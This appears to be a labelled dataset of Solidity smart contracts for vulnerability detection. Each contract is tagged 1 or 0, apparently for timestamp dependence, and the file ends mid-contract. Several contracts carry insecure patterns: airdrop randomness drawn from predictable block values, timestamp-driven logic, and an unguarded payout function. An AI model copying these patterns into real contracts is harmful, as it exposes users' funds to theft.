1<CODESPLIT>contract TokenSale{    address public creator;    address public tokenContract;    uint public tokenPrice;      uint public deadline;    constructor(address source)    {        creator = msg.sender;        tokenContract = source;    }    function setPrice(uint price)    {        if (msg.sender == creator) tokenPrice = price;    }    function setDeadline(uint timestamp)    {        if (msg.sender == creator) deadline = timestamp;    }    function buyTokens(address beneficiary) payable    {        require(            block.timestamp < deadline            && tokenPrice > 0            && YellowBetterToken(tokenContract).transfer(beneficiary, 1000000000000000000 * msg.value / tokenPrice));    }    function payout()    {        creator.transfer(this.balance);    }}
1<CODESPLIT>contract LescovexERC20 is Ownable {    using SafeMath for uint256;    mapping (address => uint256) public balances;    mapping (address => mapping (address => uint256)) internal allowed;    mapping (address => timeHold) holded;    struct timeHold{        uint256[] amount;        uint256[] time;        uint256 length;    }         string public constant standard = "ERC20 Lescovex ISC Income Smart Contract";    uint8 public constant decimals = 8;      uint256 public holdMax = 100;    uint256 public totalSupply;    uint256 public holdTime;    string public name;    string public symbol;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    function balanceOf(address _owner) public view returns (uint256) {        return balances[_owner];    }    function holdedOf(address _owner) public view returns (uint256) {                          uint256 requiredTime = block.timestamp - holdTime;                 uint256 iValid = 0;                                  uint256 iNotValid = holded[_owner].length;           if (iNotValid == 0                                   || holded[_owner].time[iValid] >= requiredTime) {              return 0;        }                 uint256 i = iNotValid / 2;           while (i > iValid) {               if (holded[_owner].time[i] < requiredTime) {                iValid = i;                } else {                iNotValid = i;              }            i = (iNotValid + iValid) / 2;        }        return holded[_owner].amount[iValid];    }    function hold(address _to, uint256 _value) internal {        assert(holded[_to].length < holdMax);                          uint256 len = holded[_to].length;        uint256 accumulatedValue = (len == 0 ) ?            _value :            _value + holded[_to].amount[len - 1];                 holded[_to].amount.push(accumulatedValue);        holded[_to].time.push(block.timestamp);        holded[_to].length++;    }    function setHoldTime(uint256 _value) external onlyOwner{      holdTime = _value;    }    function setHoldMax(uint256 _value) external onlyOwner{      holdMax = _value;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(_to != address(0));        require(_value <= balances[msg.sender]);                 balances[msg.sender] = balances[msg.sender].sub(_value);        delete holded[msg.sender];        hold(msg.sender,balances[msg.sender]);        hold(_to,_value);        balances[_to] = balances[_to].add(_value);        emit Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {        require(_to != address(0));        require(_value <= balances[_from]);        require(_value <= allowed[_from][msg.sender]);        balances[_from] = balances[_from].sub(_value);        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);        delete holded[_from];        hold(_from,balances[_from]);        hold(_to,_value);        balances[_to] = balances[_to].add(_value);        emit Transfer(_from, _to, _value);        return true;    }    function approve(address _spender, uint256 _value) public returns (bool) {        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }    function allowance(address _owner, address _spender) public view returns (uint256) {        return allowed[_owner][_spender];    }    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);        return true;    }    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {        uint oldValue = allowed[msg.sender][_spender];        if (_subtractedValue > oldValue) {            allowed[msg.sender][_spender] = 0;        } else {            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);        }        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);        return true;    }         function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) {            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        }    }}interface tokenRecipient {    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external ;}
0<CODESPLIT>contract Lescovex_ISC is LescovexERC20 {    uint256 public contractBalance = 0;         event LogDeposit(address sender, uint amount);    event LogWithdrawal(address receiver, uint amount);    address contractAddr = this;         constructor (        uint256 initialSupply,        string contractName,        string tokenSymbol,        uint256 contractHoldTime,        address contractOwner        ) public {        totalSupply = initialSupply;           name = contractName;                      symbol = tokenSymbol;                  holdTime = contractHoldTime;        balances[contractOwner] = totalSupply;    }    function deposit() external payable onlyOwner returns(bool success) {        contractBalance = contractAddr.balance;                 emit LogDeposit(msg.sender, msg.value);        return true;    }    function withdrawReward() external {        uint256 ethAmount = (holdedOf(msg.sender) * contractBalance) / totalSupply;        require(ethAmount > 0);                 emit LogWithdrawal(msg.sender, ethAmount);        delete holded[msg.sender];        hold(msg.sender,balances[msg.sender]);                 msg.sender.transfer(ethAmount);    }    function withdraw(uint256 value) external onlyOwner {                 msg.sender.transfer(value);                 emit LogWithdrawal(msg.sender, value);    }}
1<CODESPLIT>contract daocrowdsale {    enum State {READY, LAUNCHED, STAGE1, STAGE2, STAGE3, FAIL}    State currentState;    uint256 timeOfNextShift;    uint256 timeOfPreviousShift;    function StateShift() private returns (bool){        if (currentState == State.STAGE2) {            timeOfPreviousShift = block.timestamp;            timeOfNextShift = (now + 3650 * (1 days));            return true;        }        return false;    }}
0<CODESPLIT>contract ProofOfExistence {  mapping (string => uint) private proofs;  function notarize(string sha256) {    if ( bytes(sha256).length == 64 ){      if ( proofs[sha256] == 0 ){        proofs[sha256] = block.timestamp;      }    }    return;  }}
1<CODESPLIT>contract MyPurchaseContract {  uint256 public startAt;  uint256 public stopAt;  uint256 public grantAt;  function MyPurchaseContrat() public returns (uint256) {     startAt = block.timestamp;     stopAt = startAt + 60;     grantAt = startAt + 120;     return startAt + stopAt + grantAt;  }}
0<CODESPLIT>contract RefundableCrowdsale is FinalizableCrowdsale {  using SafeMath for uint256;     uint256 public goal;     RefundVault public vault;  function RefundableCrowdsale(uint256 _goal) public {    require(_goal > 0);    vault = new RefundVault(wallet);    goal = _goal;  }           function forwardFunds() internal {    vault.deposit.value(msg.value)(msg.sender);  }     function claimRefund() public {    require(isFinalized);    require(!goalReached());    vault.refund(msg.sender);  }     function finalization() internal {    if (goalReached()) {      vault.close();    } else {      vault.enableRefunds();    }    super.finalization();  }  function goalReached() public view returns (bool) {    return weiRaised >= goal;  }}
0<CODESPLIT>contract modularLong is F3Devents {}
1<CODESPLIT>contract SCardLong is modularLong {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcLong for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xc873e3646534b2253f324ee7f5f7f5b2a857ba9a);    address public ceo;    address public cfo;     string constant public name = "SCard";    string constant public symbol = "SCARD";    uint256 private rndExtra_ = 30 seconds;           uint256 private rndGap_ = 30 seconds;             uint256 constant private rndInit_ = 24 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;         uint256 public rID_;      mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;      mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;           mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;          constructor()        public    {        ceo = msg.sender;        cfo = msg.sender;		         fees_[0] = F3Ddatasets.TeamFee(30,0);                   fees_[1] = F3Ddatasets.TeamFee(60,0);                    fees_[2] = F3Ddatasets.TeamFee(20,0);                    fees_[3] = F3Ddatasets.TeamFee(40,0);                            potSplit_[0] = F3Ddatasets.PotSplit(25,0);                  potSplit_[1] = F3Ddatasets.PotSplit(30,0);                   potSplit_[2] = F3Ddatasets.PotSplit(10,0);                   potSplit_[3] = F3Ddatasets.PotSplit(20,0);  	}    modifier isActivated() {        require(activated_ == true, "Not Active!");         _;    }    modifier isHuman() {        address _addr = msg.sender;        require (_addr == tx.origin);        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "Not Human");        _;    }    modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "Too Less");        require(_eth <= 100000000000000000000000, "Too More");        _;        }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {        F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);        uint256 _pID = pIDxAddr_[msg.sender];        buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }    function modCEOAddress(address newCEO)         isHuman()         public    {        require(address(0) != newCEO, "CEO Can not be 0");        require(ceo == msg.sender, "only ceo can modify ceo");        ceo = newCEO;    }    function modCFOAddress(address newCFO)         isHuman()         public    {        require(address(0) != newCFO, "CFO Can not be 0");        require(cfo == msg.sender, "only cfo can modify cfo");        cfo = newCFO;    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {        F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);        uint256 _pID = pIDxAddr_[msg.sender];                if (_affCode == 0 || _affCode == _pID)        {            _affCode = plyr_[_pID].laff;            }         else if (_affCode != plyr_[_pID].laff)         {            plyr_[_pID].laff = _affCode;        }        _team = verifyTeam(_team);        buyCore(_pID, _affCode, _team, _eventData_);    }         function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {        F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);        uint256 _pID = pIDxAddr_[msg.sender];        uint256 _affID;        if (_affCode == address(0) || _affCode == msg.sender)        {            _affID = plyr_[_pID].laff;        }         else         {            _affID = pIDxAddr_[_affCode];            if (_affID != plyr_[_pID].laff)            {                plyr_[_pID].laff = _affID;            }        }                _team = verifyTeam(_team);        buyCore(_pID, _affID, _team, _eventData_);    }         function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {        F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                uint256 _pID = pIDxAddr_[msg.sender];        uint256 _affID;        if (_affCode == '' || _affCode == plyr_[_pID].name)        {            _affID = plyr_[_pID].laff;        }         else         {            _affID = pIDxName_[_affCode];            if (_affID != plyr_[_pID].laff)            {                plyr_[_pID].laff = _affID;            }        }                _team = verifyTeam(_team);        buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {        F3Ddatasets.EventReturns memory _eventData_;                uint256 _pID = pIDxAddr_[msg.sender];        if (_affCode == 0 || _affCode == _pID)        {            _affCode = plyr_[_pID].laff;        }         else if (_affCode != plyr_[_pID].laff)         {            plyr_[_pID].laff = _affCode;        }        _team = verifyTeam(_team);        reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }             function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {        F3Ddatasets.EventReturns memory _eventData_;                uint256 _pID = pIDxAddr_[msg.sender];        uint256 _affID;        if (_affCode == address(0) || _affCode == msg.sender)        {            _affID = plyr_[_pID].laff;        }         else         {            _affID = pIDxAddr_[_affCode];            if (_affID != plyr_[_pID].laff)            {                plyr_[_pID].laff = _affID;            }        }        _team = verifyTeam(_team);        reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {        F3Ddatasets.EventReturns memory _eventData_;                uint256 _pID = pIDxAddr_[msg.sender];        uint256 _affID;        if (_affCode == '' || _affCode == plyr_[_pID].name)        {            _affID = plyr_[_pID].laff;        }         else         {            _affID = pIDxName_[_affCode];            if (_affID != plyr_[_pID].laff)            {                plyr_[_pID].laff = _affID;            }        }                _team = verifyTeam(_team);        reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {        uint256 _rID = rID_;        uint256 _now = now;        uint256 _pID = pIDxAddr_[msg.sender];        uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {            F3Ddatasets.EventReturns memory _eventData_;        	round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            _eth = withdrawEarnings(_pID);            if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                        _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                    emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }         else         {            _eth = withdrawEarnings(_pID);            if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);            emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];        emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }         function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];        emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }         function getBuyPrice()        public         view         returns(uint256)    {                  uint256 _rID = rID_;        uint256 _now = now;        if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else             return ( 7500000000000000 );    }             function getTimeLeft()        public        view        returns(uint256)    {        uint256 _rID = rID_;        uint256 _now = now;                if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                uint256 _rID = rID_;                if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {            if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );            } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }        } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }        function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {        uint256 _rID = rID_;                return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }         function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {        uint256 _rID = rID_;        uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {            core(_rID, _pID, msg.value, _affID, _team, _eventData_);            }         else         {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                             _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                emit F3Devents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.P3DAmount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                uint256 _rID = rID_;        uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                         plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);            core(_rID, _pID, _eth, _affID, _team, _eventData_);        }                  else if (_now > round_[_rID].end && round_[_rID].ended == false)         {            round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                        _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                            emit F3Devents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }    }             function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {        if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                         if (_eth > 1000000000)         {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {                updateTimer(_keys, _rID);                if (round_[_rID].plyr != _pID)                    round_[_rID].plyr = _pID;                  if (round_[_rID].team != _team)                    round_[_rID].team = _team;                 _eventData_.compressedData = _eventData_.compressedData + 100;            }                                     if (_eth >= 100000000000000000)            {                airDropTracker_++;                if (airdrop() == true)                {                    uint256 _prize;                    if (_eth >= 10000000000000000000)                    {                        _prize = ((airDropPot_).mul(75)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                        airDropPot_ = (airDropPot_).sub(_prize);                        _eventData_.compressedData += 300000000000000000000000000000000;                    }                     else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000)                     {                        _prize = ((airDropPot_).mul(50)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                        airDropPot_ = (airDropPot_).sub(_prize);                        _eventData_.compressedData += 200000000000000000000000000000000;                    }                     else if (_eth >= 100000000000000000 && _eth < 1000000000000000000)                     {                        _prize = ((airDropPot_).mul(25)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                        airDropPot_ = (airDropPot_).sub(_prize);                        _eventData_.compressedData += 300000000000000000000000000000000;                    }                    _eventData_.compressedData += 10000000000000000000000000000000;                    _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                    airDropTracker_ = 0;                }            }                            _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);            round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                        endTx(_pID, _team, _eth, _keys, _eventData_);        }    }         function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {        uint256 _now = now;        if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else            return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {        uint256 _rID = rID_;        uint256 _now = now;        if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else             return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }        function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];        if (_pID == 0)        {            _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                        pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;            _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }        function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }        function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                plyr_[_pID].lrnd = rID_;        _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                uint256 _rID = rID_;                uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                uint256 _pot = round_[_rID].pot;                uint256 _win = (_pot.mul(55)) / 100;        uint256 _com = (_pot / 20);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                plyr_[_winPID].win = _win.add(plyr_[_winPID].win);        _com = _com.add(_p3d);        cfo.transfer(_com);                round_[_rID].mask = _ppt.add(round_[_rID].mask);                _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {            plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);            plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {        uint256 _now = now;        uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }        function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _com = _eth / 20;                 uint256 _aff = _eth / 10;                 if (_team == 0 ) {            _aff = _eth.mul(30) / 100;        }                         if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _com = _com.add(_aff);        }        cfo.transfer(_com);                return(_eventData_);    }    function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {        uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 20);        airDropPot_ = airDropPot_.add(_air);        if (_team == 0){            _eth = _eth.sub(((_eth.mul(40)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));        }else{            _eth = _eth.sub(((_eth.mul(20)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));        }                uint256 _pot = _eth.sub(_gen);                uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {        uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);        uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask 